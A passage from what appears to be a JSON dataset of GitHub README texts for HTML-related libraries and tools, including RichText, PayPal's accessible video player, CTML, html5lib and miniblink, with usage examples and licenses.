\u5173\u4e8eissue\n\n\u6700\u8fd1\u4e00\u6bb5\u65f6\u95f4\u4f1a\u6bd4\u8f83\u5fd9\uff0cissue\u4e0d\u80fd\u53ca\u65f6\u5904\u7406\uff0c\u4e00\u822c\u4f1a\u5b9a\u65f6\u62bd\u7a7a\u96c6\u4e2d\u89e3\u51b3issue\uff0c\u4f46\u65f6\u95f4\u6709\u9650\u89e3\u51b3\u901f\u5ea6\u4e0a\u4e0d\u6562\u4fdd\u8bc1\u3002\n\n\u6b22\u8fce\u63d0\u4ea4pull request\u5e2e\u52a9\u5b8c\u5584\u8fd9\u4e2a\u9879\u76ee\n\n### \u6ce8\u610f\n\n\u5728\u7b2c\u4e00\u6b21\u8c03\u7528RichText\u4e4b\u524d\u5148\u8c03\u7528`RichText.initCacheDir()`\u65b9\u6cd5\u8bbe\u7f6e\u7f13\u5b58\u76ee\u5f55\n\nImageFixCallback\u7684\u56de\u8c03\u65b9\u6cd5\u4e0d\u4e00\u5b9a\u662f\u5728\u4e3b\u7ebf\u7a0b\u56de\u8c03\uff0c\u6ce8\u610f\u4e0d\u8981\u8fdb\u884cUI\u64cd\u4f5c\n\n\u672c\u5730\u56fe\u7247\u7531\u6839\u8def\u5f84`\\`\u5f00\u5934\uff0cAssets\u76ee\u5f55\u56fe\u7247\u7531`file:\/\/\/android_asset\/`\u5f00\u5934\n\nGif\u56fe\u7247\u64ad\u653e\u4e0d\u652f\u6301\u786c\u4ef6\u52a0\u901f\uff0c\u82e5\u8981\u4f7f\u7528Gif\u56fe\u7247\u8bf7\u5148\u5173\u95edTextView\u7684\u786c\u4ef6\u52a0\u901f\n```\ntextView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);\n```\n\n### \u4f7f\u7528\u65b9\u5f0f\n\n[\u591a\u770bwiki](https:\/\/github.com\/zzhoujay\/RichText\/wiki)\u3001[\u591a\u770bwiki](https:\/\/github.com\/zzhoujay\/RichText\/wiki)\u3001[\u591a\u770bwiki](https:\/\/github.com\/zzhoujay\/RichText\/wiki)\uff0c\u91cd\u8981\u7684\u4e8b\u60c5\u8bf4\u4e09\u904d\n\n### \u5173\u4e8e\u81ea\u5b9a\u4e49\u7684Html\u89e3\u6790\u5668\n\nHtml\u89e3\u6790\u5668\u5b50\u9879\u76ee\uff1a[Html](https:\/\/github.com\/zzhoujay\/Htm)\n\n### \u5173\u4e8eMarkdown\n\nMarkdown\u6e90\u4e8e\u5b50\u9879\u76ee\uff1a[Markdown](https:\/\/github.com\/zzhoujay\/Markdown)\n\n\u82e5\u5728markdown\u89e3\u6790\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u4ec0\u4e48\u95ee\u9898\u53ef\u4ee5\u5728\u8be5\u9879\u76ee\u4e2d\u53cd\u9988\n\n### \u5173\u4e8e\u5bcc\u6587\u672c\u7f16\u8f91\u5668\n\n\u7f16\u8f91\u5668\u5f00\u53d1\u5df2\u6682\u505c\uff0c[RichEditor](https:\/\/github.com\/zzhoujay\/RichEditor)\n\n### \u5177\u4f53\u4f7f\u7528\u8bf7\u67e5\u770bdemo\n\n[ListView Demo](https:\/\/github.com\/zzhoujay\/RichText\/blob\/master\/app\/src\/main\/java\/zhou\/demo\/ListViewActivity.java)\u3001\n[RecyclerView Demo](https:\/\/github.com\/zzhoujay\/RichText\/blob\/master\/app\/src\/main\/java\/zhou\/demo\/RecyclerViewActivity.java)\u3001\n[Gif Demo](https:\/\/github.com\/zzhoujay\/RichText\/blob\/master\/app\/src\/main\/java\/zhou\/demo\/GifActivity.java)\n\n\n### License\n\n```\nThe MIT License (MIT)\n\nCopyright (c) 2016 zzhoujay\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and\/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n```\n\n_by zzhoujay_\n"},{"repo":"\/paypal\/accessible-html5-video-player","language":"JavaScript","readme_contents":"# Accessible HTML5 Video Player\n[![paypal](https:\/\/rawgit.com\/aleen42\/badges\/master\/src\/paypal.svg)](https:\/\/rawgit.com\/aleen42\/badges\/master\/src\/paypal.svg)\n[![javascript](https:\/\/cdn.rawgit.com\/aleen42\/badges\/master\/src\/javascript.svg)](https:\/\/cdn.rawgit.com\/aleen42\/badges\/master\/src\/javascript.svg)\n\n## What is it?\nA lightweight HTML5 video player which includes support for captions and screen reader accessibility. For details, read the blog post [Introducing an Accessible HTML5 Video Player](https:\/\/medium.com\/paypal-engineering\/introducing-an-accessible-html5-video-player-95b760286c88) on the PayPal Engineering blog (updated link). Also see [7 Lessons from Developing an Accessible HTML 5 Video Player](https:\/\/paulschantz.com\/2015\/03\/06\/7-lessons-from-developing-an-accessible-html-5-video-player\/).\n\n## Features\n- Provides an HTML5 video player with custom controls.\n- Supports captions; simply denote a VTT caption file using the standard HTML5 video syntax.\n- Uses native HTML5 form controls for volume (range input) and progress indication (progress element).\n- Accessible to keyboard-only users and screen reader users.\n- Option provided to set captions on or off by default (upon loading).\n- Option provided to set number of seconds by which to rewind and forward.\n- Text strings for the controls are externalized to allow for internationalization (fall 2015).\n- No dependencies. Written in \"vanilla\" JavaScript.\n- When JavaScript is unavailable, the browser's native controls are used.\n- React support\n\n## Implementation\n\n### CSS and Image\nInsert the CSS in the Head of your HTML document. You'll also need to upload the sprite image (or use your own) and adjust the path in the CSS file.\n\n```html\n<link rel=\"stylesheet\" href=\"\/css\/px-video.css\" \/>\n```\n\n### HTML\nInsert the HTML5 video markup in the Body of your HTML document. Replace the video, poster, and caption URLs. Modify the sizes of video and fallback image as needed.\n```html\n<div class=\"px-video-container\" id=\"myvid\">\n    <div class=\"px-video-img-captions-container\">\n        <div class=\"px-video-captions hide\" aria-hidden=\"true\"><\/div>\n        <video width=\"640\" height=\"360\" poster=\"media\/foo.jpg\" controls>\n            <source src=\"foo.mp4\" type=\"video\/mp4\" \/>\n            <source src=\"foo.webm\" type=\"video\/webm\" \/>\n            <track kind=\"captions\" label=\"English captions\" src=\"media\/foo.vtt\" srclang=\"en\" default \/>\n            <div>\n                <a href=\"foo.mp4\">\n                    <img src=\"media\/foo.jpg\" width=\"640\" height=\"360\" alt=\"download video\" \/>\n                <\/a>\n            <\/div>\n        <\/video>\n    <\/div>\n    <div class=\"px-video-controls\"><\/div>\n<\/div>\n```\n\n### JavaScript\nInsert two JavaScript files right before the closing Body element of your HTML document. Add a Script element to initialize the video. Options are passed in `JSON` format. The options are:\n\n|  option | description  | dataType  |   | default   |\n|---|---|---|---|---|\n| videoId  | the value of the ID of the widget container  |  string | required  | |\n| captionsOnDefault  |  denotes whether to show or hide caption upon loading  | boolean  |  optional | `true`  |\n| seekInterval  | the number of seconds to rewind and fast forward  | number  | optional  |  10 |\n| videoTitle  | short title of video; used for aria-label attribute on Play button to clarify to screen reader user what will be played  | string  | optional  | Play  |\n| debug  |  turn console logs on or off | boolean  |  optional |  `false` |\n\n```html\n<script src=\"js\/strings.js\"><\/script>\n<script src=\"js\/px-video.js\"><\/script>\n<script>\n\/\/ Initialize\nnew InitPxVideo({\n    \"videoId\": \"myvid\",\n    \"captionsOnDefault\": true,\n    \"seekInterval\": 20,\n    \"videoTitle\": \"clips of stand-up comedy\",\n    \"debug\": true\n});\n<\/script>\n```\n\n### [View Demo](http:\/\/paypal.github.io\/accessible-html5-video-player\/)\n\n## React Version\nThe React version has been designed to be integrated into your react codebase easily. The video React component is named `PXvideo` and has the below API:\n\n```javascript\n<PXVideo\n    sources={[\n    'https:\/\/www.paypalobjects.com\/webstatic\/mktg\/videos\/PayPal_AustinSMB_baseline.mp4',\n    'https:\/\/www.paypalobjects.com\/webstatic\/mktg\/videos\/PayPal_AustinSMB_baseline.webm'\n  ]}\n  caption={{\n    label: 'English captions',\n    source: 'media\/captions_PayPal_Austin_en.vtt',\n    lang: 'EN',\n    default: true\n  }}\n  poster=\"media\/poster_PayPal_Austin2.jpg\"\n  width=\"640\"\n  height=\"360\"\n  controls={true}\n  id=\"myvid\"\n  fallback={true}\n  seekInterval={20}\n  debug={true}\n\/>\n```\nA demo could be reached at: [View Demo](http:\/\/paypal.github.io\/accessible-html5-video-player\/index.react.html)\n\n## Development\n```\nnpm install \/\/ install dependencies\nnpm run react \/\/ transpile .jsx into valid .js using Babel\n```\n\n## Feedback and Contributions\nIf you experience any errors or if you have ideas for improvement, please feel free to open an issue or send a pull request.\n\n~~You can also follow and contact the PayPal Accessibility team on Twitter: [@PayPalInclusive](https:\/\/twitter.com\/paypalinclusive)~~ No longer exists.\n\n## Authors\/Maintainer\n- Dennis Lembree (primary developer) [https:\/\/github.com\/weboverhauls](https:\/\/github.com\/weboverhauls) || [@dennisl](https:\/\/twitter.com\/dennisl)\n- Victor Tsaran (consultation and testing) || [https:\/\/github.com\/vick08](https:\/\/github.com\/vick08) || [@vick08](https:\/\/twitter.com\/vick08)\n- Jason Gabriele (consultation)\n- Tim Resudek (design)\n- Nawaz Khan (developer) [https:\/\/github.com\/mpnkhan](https:\/\/github.com\/mpnkhan)\n- Hozefa Jodiawalla (developer) [https:\/\/github.com\/hozefaj](https:\/\/github.com\/hozefaj) || [@hozefaj](https:\/\/twitter.com\/HozefaJ)\n\n## Browser Support\n- Chrome: full support.\n- Safari: full support.\n- Firefox: full support.\n- Internet Explorer 10, 11: full support.\n- Internet Explorer 9: native video player used (aesthetic choice since HTML5 range input and progress element are not supported).\n- Internet Explorer 8: renders fallback content of video element (in the demo, this is an image linked to the video file).\n- Smartphones and tablets: controls and captions are not customized as both are natively supported in latest versions.\n\n## Limitations and Known Issues\n- Currently, only one caption file per video is supported.\n- Only VTT caption files are supported (not SRT nor TTML). VTT cue settings are not supported but inline styles function (see first few lines of example).\n- The controls have a minimum width of 360px.\n\n## Related Resources\n- [HTML5 Video Events and API](http:\/\/www.w3.org\/2010\/05\/video\/mediaevents.html) - by W3C\n- [Adding captions and subtitles to HTML5 video](https:\/\/developer.mozilla.org\/en-US\/Apps\/Build\/Audio_and_video_delivery\/Adding_captions_and_subtitles_to_HTML5_video#Internet_Explorer) - by MDN\n- [Simple SubRip to WebVTT converter](https:\/\/atelier.u-sub.net\/srt2vtt\/) - tool to convert SRT captions to WebVTT\n- [Able Player](https:\/\/github.com\/ableplayer\/ableplayer) - accessible cross-browser media player by Terrill Thompson\n\n### Projects influenced by the PayPal Accessible HTML5 Video Player\n- [Universal Video Player](https:\/\/source.ind.ie\/project\/video-player) - by Ind.ie, @LauraKalbag\n- [Plyr](https:\/\/github.com\/selz\/plyr) - by @sam_potts, @selz\n\n## Copyright and License\nCopyright 2019, PayPal under [the BSD license](LICENSE.md).\n"},{"repo":"\/tinfoilboy\/CTML","language":"C++","readme_contents":"# CTML\n\n[![Build Status](https:\/\/travis-ci.com\/tinfoilboy\/CTML.svg?branch=master)](https:\/\/travis-ci.com\/tinfoilboy\/CTML)\n[![License: MIT](https:\/\/img.shields.io\/badge\/License-MIT-yellow.svg)](https:\/\/opensource.org\/licenses\/MIT)\n[![Github Releases](https:\/\/img.shields.io\/github\/release\/tinfoilboy\/CTML.svg)](https:\/\/github.com\/tinfoilboy\/CTML\/releases)\n\nCTML is a C++ HTML document constructor, that was designed to be simple to use and implement.\nHas no dependencies on any other projects, only the C++ standard library.\n\n## Building\n\nFor use in a project, you may copy the `ctml.hpp` file into your project and include that way.\nAlternatively, if you use CMake, you could add CTML as a dependency to your project.\n\n## Tests\n\nTests are included with the library and are written using the [Catch2](https:\/\/github.com\/catchorg\/Catch2) header-only test library.\nThese tests are located in the `tests\/tests.cpp` file.\n\n## Usage\n\n### Namespacing\n\nEvery class and enum in CTML is enclosed in the `CTML` namespace.\nFor instance, the `Node` class would be under `CTML::Node`.\n\n### Chaining\n\nMost methods for operating on `CTML::Node` instances are chainable, meaning that you may run these operations multiple times on the same expression.\n\n### Nodes\n\nThe basis of CTML is the `CTML::Node` class, which allows you to create\nsimple HTML nodes and convert them to a `std::string` value.\n\nThe most simple valid HTML node that can be represented is, for instance, an empty paragraph tag, which can be created with the following code.\n\n```cpp\nCTML::Node node(\"p\");\n```\n\nWhich would output in string form as:\n\n```html\n<p><\/p>\n```\n\nTo get this string output, you would use the `CTML::Node::ToString(CTML::ToStringOptions)` method. This method outputs a string representation of the Node and its children using the options supplied.\n\nThis `ToStringOptions` structure allows the user to change whether the string outputs elements using multiple lines or one line, if nodes should have a trailing new line at the end, the indentation level of the node if outputting to multiple lines, and whether text content of an element should be escaped.\n\nYou can add simple text content to this Node by changing that line to the following:\n\n```cpp\nCTML::Node node(\"p\", \"Hello world!\");\n```\n\nWhich would output as the following:\n\n```html\n<p>Hello world!<\/p>\n```\n\nYou can quickly add classes and IDs to a Node (possibly attributes in the future) with a syntax in the name field that mimics Emmet Abbriviations.\nThis is shown in the following definition:\n\n```cpp\nCTML::Node node(\"p.text#para\", \"Hello world!\");\n```\n\nWhich would output the following HTML:\n\n```html\n<p class=\"text\" id=\"para\">Hello world!<\/p>\n```\n\nYou can then append children to these Node instances by using the `CTML::Node::AppendChild(CTML::Node)` method, like below:\n\n```cpp\nCTML::Node node(\"div\");\n\nnode.AppendChild(CTML::Node(\"p\", \"Hello world!\"));\n```\n\nWhich would give this output:\n\n```html\n<div><p>Hello world!<\/p><\/div>\n```\n\nYou can also append more text to the parent node with the `CTML::Node::AppendText(std::string)` method, which simply\nadds a Node with the type of `TEXT` to the children.\nThis is shown below:\n\n```cpp\nCTML::Node node(\"div\");\n\nnode.AppendChild(CTML::Node(\"p\", \"Hello world!\"))\n    .AppendText(\"Hello again!\");\n```\n\nWhich would output as:\n\n```html\n<div><p>Hello world!<\/p> Hello again!<\/div>\n```\n\nYou can also set attributes on a Node, modifying the below example to do so looks like:\n\n```cpp\nCTML::Node node(\"div\");\n\nnode.SetAttribute(\"title\", \"Hello title!\")\n    .AppendChild(CTML::Node(\"p\", \"Hello world!\"))\n    .AppendText(\"Hello again!\");\n```\n\nWhich would output as:\n\n```html\n<div title=\"Hello title!\"><p>Hello world!<\/p> Hello again!<\/div>\n```\n\n### Documents\n\nTo create an HTML document that contains these nodes, you can use the `CTML::Document` class. This class includes doctype, head, and body nodes for adding nodes to.\n\nA simple HTML document would be created with:\n\n```cpp\nCTML::Document document;\n```\n\nYou can then output this as a string with the `CTML::Document::ToString(CTML::ToStringOptions)` method. This method uses the same structure that the node class uses.\n\nBy using the default empty `Document::ToString` method you would get an output of:\n\n```html\n<!DOCTYPE html><html><head><\/head><body><\/body><\/html>\n```\n\nYou can then append nodes to it using the `CTML::Document::AppendNodeToHead(CTML::Node)` or `CTML::Document::AppendNodeToBody(CTML::Node)` methods.\n\n## License\n\nCTML is licensed under the MIT License, the terms of which can be seen [here](https:\/\/github.com\/tinfoilboy\/CTML\/blob\/master\/LICENSE).\n"},{"repo":"\/aosp-mirror\/platform_packages_apps_htmlviewer","language":"Java","readme_contents":"error: no README"},{"repo":"\/microsoft\/project-html-website","language":"CSS","readme_contents":"# This repo is no longer used. Please see  https:\/\/github.com\/microsoft\/devops-project-samples for samples of Azure DevOps Project\n\n| Language | Platform | Author |\n| -------- | --------|--------|\n| HTML |  Azure Web App, Virtual Machine| |\n\n# Sample HTML website \n\nSample HTML\/CSS web app that you can deploy to Azure. \n\n## License\n\nSee [LICENSE](LICENSE).\n\n\n## Contributing\nThis project has adopted the [Microsoft Open Source Code of Conduct](https:\/\/opensource.microsoft.com\/codeofconduct\/).\nFor more information see the [Code of Conduct FAQ](https:\/\/opensource.microsoft.com\/codeofconduct\/faq\/) or\ncontact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.\n\n"},{"repo":"\/cdfmr\/ga2html","language":"C","readme_contents":"# ga2html\n\nConvert xml files produced by [GReader-Archive](https:\/\/github.com\/Aulddays\/GReader-Archive) to html pages.\n\n### Platforms\n\nOS X, Linux & Windows.\n\n### Requirement\n\nexpat\n\n### How to build\n\ng++ -o ga2html -O2 ga2html.cc -lexpat\n\n### How to use\n\nExecute ga2html without any parameter to get help.\n"},{"repo":"\/html5lib\/html5lib-python","language":"Python","readme_contents":"html5lib\n========\n\n.. image:: https:\/\/travis-ci.org\/html5lib\/html5lib-python.svg?branch=master\n    :target: https:\/\/travis-ci.org\/html5lib\/html5lib-python\n\n\nhtml5lib is a pure-python library for parsing HTML. It is designed to\nconform to the WHATWG HTML specification, as is implemented by all major\nweb browsers.\n\n\nUsage\n-----\n\nSimple usage follows this pattern:\n\n.. code-block:: python\n\n  import html5lib\n  with open(\"mydocument.html\", \"rb\") as f:\n      document = html5lib.parse(f)\n\nor:\n\n.. code-block:: python\n\n  import html5lib\n  document = html5lib.parse(\"<p>Hello World!\")\n\nBy default, the ``document`` will be an ``xml.etree`` element instance.\nWhenever possible, html5lib chooses the accelerated ``ElementTree``\nimplementation (i.e. ``xml.etree.cElementTree`` on Python 2.x).\n\nTwo other tree types are supported: ``xml.dom.minidom`` and\n``lxml.etree``. To use an alternative format, specify the name of\na treebuilder:\n\n.. code-block:: python\n\n  import html5lib\n  with open(\"mydocument.html\", \"rb\") as f:\n      lxml_etree_document = html5lib.parse(f, treebuilder=\"lxml\")\n\nWhen using with ``urllib2`` (Python 2), the charset from HTTP should be\npass into html5lib as follows:\n\n.. code-block:: python\n\n  from contextlib import closing\n  from urllib2 import urlopen\n  import html5lib\n\n  with closing(urlopen(\"http:\/\/example.com\/\")) as f:\n      document = html5lib.parse(f, transport_encoding=f.info().getparam(\"charset\"))\n\nWhen using with ``urllib.request`` (Python 3), the charset from HTTP\nshould be pass into html5lib as follows:\n\n.. code-block:: python\n\n  from urllib.request import urlopen\n  import html5lib\n\n  with urlopen(\"http:\/\/example.com\/\") as f:\n      document = html5lib.parse(f, transport_encoding=f.info().get_content_charset())\n\nTo have more control over the parser, create a parser object explicitly.\nFor instance, to make the parser raise exceptions on parse errors, use:\n\n.. code-block:: python\n\n  import html5lib\n  with open(\"mydocument.html\", \"rb\") as f:\n      parser = html5lib.HTMLParser(strict=True)\n      document = parser.parse(f)\n\nWhen you're instantiating parser objects explicitly, pass a treebuilder\nclass as the ``tree`` keyword argument to use an alternative document\nformat:\n\n.. code-block:: python\n\n  import html5lib\n  parser = html5lib.HTMLParser(tree=html5lib.getTreeBuilder(\"dom\"))\n  minidom_document = parser.parse(\"<p>Hello World!\")\n\nMore documentation is available at https:\/\/html5lib.readthedocs.io\/.\n\n\nInstallation\n------------\n\nhtml5lib works on CPython 2.7+, CPython 3.4+ and PyPy.  To install it,\nuse:\n\n.. code-block:: bash\n\n    $ pip install html5lib\n\n\nOptional Dependencies\n---------------------\n\nThe following third-party libraries may be used for additional\nfunctionality:\n\n- ``datrie`` can be used under CPython to improve parsing performance\n  (though in almost all cases the improvement is marginal);\n\n- ``lxml`` is supported as a tree format (for both building and\n  walking) under CPython (but *not* PyPy where it is known to cause\n  segfaults);\n\n- ``genshi`` has a treewalker (but not builder); and\n\n- ``chardet`` can be used as a fallback when character encoding cannot\n  be determined.\n\n\nBugs\n----\n\nPlease report any bugs on the `issue tracker\n<https:\/\/github.com\/html5lib\/html5lib-python\/issues>`_.\n\n\nTests\n-----\n\nUnit tests require the ``pytest`` and ``mock`` libraries and can be\nrun using the ``py.test`` command in the root directory.\n\nTest data are contained in a separate `html5lib-tests\n<https:\/\/github.com\/html5lib\/html5lib-tests>`_ repository and included\nas a submodule, thus for git checkouts they must be initialized::\n\n  $ git submodule init\n  $ git submodule update\n\nIf you have all compatible Python implementations available on your\nsystem, you can run tests on all of them using the ``tox`` utility,\nwhich can be found on PyPI.\n\n\nQuestions?\n----------\n\nThere's a mailing list available for support on Google Groups,\n`html5lib-discuss <http:\/\/groups.google.com\/group\/html5lib-discuss>`_,\nthough you may get a quicker response asking on IRC in `#whatwg on\nirc.freenode.net <http:\/\/wiki.whatwg.org\/wiki\/IRC>`_.\n"},{"repo":"\/weolar\/miniblink49","language":"C++","readme_contents":"# \u58f0\u660e\n\n\u9274\u4e8e\u6700\u8fd1\u53d1\u751f\u7684\u4e00\u4e9b\u4e0d\u6109\u5feb\u7684\u4e8b\u60c5\uff08\u6ca1\u9519\uff0c\u8bf4\u7684\u5c31\u662f\u90a3\u4e9b\u76f4\u63a5\u628a\u4ee3\u7801\u62ff\u53bb\u6539\u4e2a\u540d\u5b57\u5c31\u5f00\u59cb\u5356\u94b1\u7684\u4eba\uff09\uff0c\n\n\u6df1\u601d\u719f\u8651\u540e\u51b3\u5b9a\u81ea2019-6-17\u8d77\u5c06\u65b0\u5f00\u4e00\u4e2a\u5206\u652f\uff0c\u5e76\u9010\u6b65\u51cf\u5c11\u6b64\u4ed3\u5e93\u7684\u66f4\u65b0\n\n\u540e\u7eed\u66f4\u65b0\u5c06\u4ee5\u4e8c\u8fdb\u5236\u53ca\u5934\u6587\u4ef6\u65b9\u5f0f\u53d1\u5e03\uff0c\u8bf7\u6301\u7eed\u5173\u6ce8\u3002\n\n\u5e0c\u671b\u5927\u5bb6\u5c0a\u91cd\u5f00\u6e90\uff0c\u5c0a\u91cd\u4f5c\u8005\u5168\u804c\u51e0\u5e74\u6301\u7eed\u66f4\u65b0\u4ed8\u51fa\u7684\u52b3\u52a8\u3002\n\n**\u4e14\u7528\u4e14\u73cd\u60dc**\n\n\u5982\u9700\u83b7\u5f97\u540e\u7eed\u652f\u6301\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u8054\u7cfb\u65b9\u5f0f\uff1a\n\nQ\u7fa4\uff1a94093808\n\nQQ\uff08weolar\uff09\uff1a93527630\n\nemail\uff1aweolar@miniblink.net\n\n\n# \u7b80\u4ecb Abstract\n\nminiblink is a open source, one file, small browser widget base on chromium.\n\nBy using C interface, you can create a browser just some line code.\n\nmore information at http:\/\/miniblink.net\n\n----\n\nminiblink\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u3001\u5355\u6587\u4ef6\u3001\u4e14\u76ee\u524d\u5df2\u77e5\u7684\u6700\u5c0f\u7684\u57fa\u4e8echromium\u7684\uff0c\u6d4f\u89c8\u5668\u63a7\u4ef6\u3002\n\n\u901a\u8fc7\u5176\u5bfc\u51fa\u7684\u7eafC\u63a5\u53e3\uff0c\u51e0\u884c\u4ee3\u7801\u5373\u53ef\u521b\u5efa\u4e00\u4e2a\u6d4f\u89c8\u5668\u63a7\u4ef6\u3002\n\n\u60a8\u53ef\u4ee5\u901a\u8fc7\u5b98\u7f51http:\/\/miniblink.net \u6765\u83b7\u53d6\u66f4\u591a\u7684\u5173\u4e8eminiblink\u7684\u4fe1\u606f\u3002\n\n\n----\n\n# \u7279\u6027 Features\n\n- \u6781\u81f4\u5c0f\u5de7\u7684\u4f53\u79ef (small size)\n- C++\uff0cC#\uff0cDelphi\u7b49\u8bed\u8a00\u8c03\u7528 (support C++\uff0cC#\uff0cDelphi language to call)\n- \u5185\u5d4cNodejs\uff0c\u652f\u6301electron (with Nodejs, can run electron)\n- \u968f\u5fc3\u6240\u6b32\u7684\u5b9a\u5236\u529f\u80fd\u3001\u6a21\u62df\u73af\u5883 (simulate other browser environment)\n- \u652f\u6301Windows xp\u3001npapi (support windows xp and npapi)\n- \u5b8c\u5584\u7684HTML5\u652f\u6301\uff0c\u5bf9\u5404\u79cd\u524d\u7aef\u5e93\u53cb\u597d (support HTML5, and friendly to front framework)\n- \u5173\u95ed\u8de8\u57df\u5f00\u5173\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u8de8\u57df\u529f\u80fd (support cross domain)\n- \u7f51\u7edc\u8d44\u6e90\u62e6\u622a\uff0c\u66ff\u6362\u4efb\u610f\u7f51\u7ad9\u4efb\u610fjs\u4e3a\u672c\u5730\u6587\u4ef6 (network intercept, you can replace any resource to local file)\n- headless\u6a21\u5f0f\uff0c\u6781\u5927\u8282\u7701\u8d44\u6e90\uff0c\u9002\u7528\u4e8e\u722c\u866b (headless mode, be suitable for Web Crawler)\n\n----\n\n# \u6587\u6863 Document\n\n\u5173\u4e8eminiblink\u7684\u4ecb\u7ecd\u89c1\u8fd9\u7bc7\u6587\u7ae0\uff1ahttps:\/\/zhuanlan.zhihu.com\/p\/22611497?group_id=764036386641707008\n\nAPI\u6587\u6863\u89c1\uff1ahttps:\/\/miniblink.net\/doc-main.html \n\n----\n\n# \u4f7f\u7528 Usage\n\u8bf7\u524d\u5f80https:\/\/github.com\/weolar\/miniblink49\/releases \u4e0b\u8f7d\u6700\u65b0\u7f16\u8bd1\u540e\u7684SDK\uff0c\u91cc\u9762\u7684demo_src\u662f\u4e2a\u5b8c\u6574\u7684\u7528\u4f8b\u3002\n\n\u6216\u8005\u524d\u5f80 https:\/\/github.com\/weolar\/mb-demo \u4e0b\u8f7d\n\n\u6700\u7b80\u5355\u7684\u521b\u5efa\u4e00\u4e2a\u7a97\u53e3\uff1a\n\n**Usage**\n\n```cpp\n\/\/ \u65e0\u8fb9\u6846\u7a97\u4f53 borderless window\nwkeWebView window = wkeCreateWebWindow(WKE_WINDOW_TYPE_TRANSPARENT, NULL, 0, 0, 640, 480);  \nwkeLoadURLW(window, L\"miniblink.net\");\n```\n![demo-1](https:\/\/weolar.github.io\/miniblink\/assets\/images\/demo-0.gif)\n\n# \u7f16\u8bd1 Build\n\n\u4e0d\u63a8\u8350\u81ea\u5df1\u7f16\u8bd1\u3002\u8bf7\u524d\u5f80https:\/\/github.com\/weolar\/miniblink49\/releases \u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u4f7f\u7528\u3002\n\n\u56e0\u4e3a\u6bcf\u5929\u6709\u5927\u91cf\u66f4\u65b0\uff0c\u6211\u65e0\u6cd5\u786e\u4fdd\u6bcf\u6b21\u66f4\u65b0\u90fd\u80fd\u4fdd\u8bc1\u7f16\u8bd1\u901a\u8fc7\u3002\u5982\u679c\u6709\u7f16\u8bd1\u9519\u8bef\uff0c\u8bf7\u4e0d\u8981\u6765\u63d0\u95ee\uff0c\u8010\u5fc3\u7b49\u5f85\u6211\u7684\u4e0b\u6b21\u63d0\u4ea4\u3002\n\n----\n\n# mini-electron\n\nmini-electron\u9879\u76ee\u662f\u4e00\u4e2a\u57fa\u4e8eminiblink\u7684\u72ec\u7acb\u9879\u76ee\uff0c\u65e8\u5728\u521b\u5efa\u4e00\u4e2a\u66f4\u5c0f\u7684electron\u8fd0\u884c\u73af\u5883\u3002\u76ee\u524d\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e00\u76ee\u6807\u3002\n\n\u901a\u8fc7\u66ff\u6362mini-electron\uff0c\u6253\u5305\u5b8c\u540e\u7684\u6587\u4ef6\u4ec5\u4ec56m\u5de6\u53f3\u3002\n\n----\n\n# \u8054\u7cfb\u65b9\u5f0f\n\n\u5927\u5bb6\u6709\u95ee\u9898\u53ef\u4ee5\u9009\u62e9\uff1a\n\n- \u52a0Q\u7fa494093808\n\n- \u90ae\u7bb1weolar@miniblink.net\n\n- github\u91cc\u7559\u8a00issue\u8ba8\u8bba\n\n- \u5173\u6ce8\u77e5\u4e4e\u4e13\u680f\uff1ahttps:\/\/zhuanlan.zhihu.com\/chrome\n\n----\n\n# \u81f4\u8c22 Thanks\n\n\u7279\u522b\u611f\u8c22\u7f51\u53cbzero\uff0c\u4ed6\u662fminiblink\u7684\u4ee3\u7801\u7684\u91cd\u8981\u8d21\u732e\u8005\u3002\n\n\u611f\u8c22\u7f51\u53cbcore\uff0c\u611f\u8c22\u7f51\u53cb\u201c\u5927\u6e05\u77e5\u5e9c\u201d\u3002\n\n\u611f\u8c22\u7f51\u53cbboxue\uff08 https:\/\/www.zhihu.com\/people\/coltor\/ \uff09\uff0c\u4ed6\u81f4\u529b\u4e8e\u5bf9miniblink\u67b6\u6784\u7684\u7814\u7a76\u53ca\u63a8\u5e7f\u3002\n\n\n"},{"repo":"\/tree-sitter\/tree-sitter-html","language":"C++","readme_contents":"tree-sitter-html\n================\n\n[![Build Status](https:\/\/travis-ci.org\/tree-sitter\/tree-sitter-html.svg?branch=master)](https:\/\/travis-ci.org\/tree-sitter\/tree-sitter-html)\n[![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/bv1i8f3yi2aoyonx\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/maxbrunsfeld\/tree-sitter-html\/branch\/master)\n\nHTML grammar for [tree-sitter][].\n\n[tree-sitter]: https:\/\/github.com\/tree-sitter\/tree-sitter\n\nReferences\n\n* [The HTML5 Spec](https:\/\/www.w3.org\/TR\/html5\/syntax.html)\n"},{"repo":"\/MarkTonkinson\/html-css-assessment","language":"CSS","readme_contents":"html-css-assessment\n===================\n"},{"repo":"\/apache\/netbeans-html4j","language":"Java","readme_contents":"# HTML\/Java API\n\nIn need of cross platform, client side interaction between Java and 